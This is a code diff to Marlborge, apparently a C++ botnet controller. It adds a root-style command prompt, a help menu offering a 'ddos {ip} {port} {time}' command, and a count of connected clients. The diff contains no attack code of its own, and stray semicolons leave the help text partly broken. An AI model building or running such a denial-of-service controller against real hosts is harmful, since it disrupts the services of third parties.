@@ -46,9 +46,24 @@ int main() {
 	std::cout << "Welcome to Marlborge" << std::endl;
 	std::cout << "Made for educational purposes only" << std::endl;
 	std::cout << std::endl << "Github: https://github.com/PR3C14D0/Marlborge" << std::endl;
+	std::cout << std::endl << "Type `help` for displaying all the commands" << std::endl;
 
 	while (true) {
-		
+		std::cout << "root@marlborge:~# ";
+		std::string option;
+		std::getline(std::cin, option);
+		std::cout << std::endl;
+
+		if (option == "help") {
+			std::cout << "Marlborge command list:\n"
+				"1.- ddos {ip} {port} {time}\n";
+				"2.- connected\n";
+		}
+
+		if (option == "connected") {
+			UINT nClientCount = clients.size();
+			std::cout << "Connected clients: " << nClientCount << std::endl;
+		}
 	}
 
 	return 0;
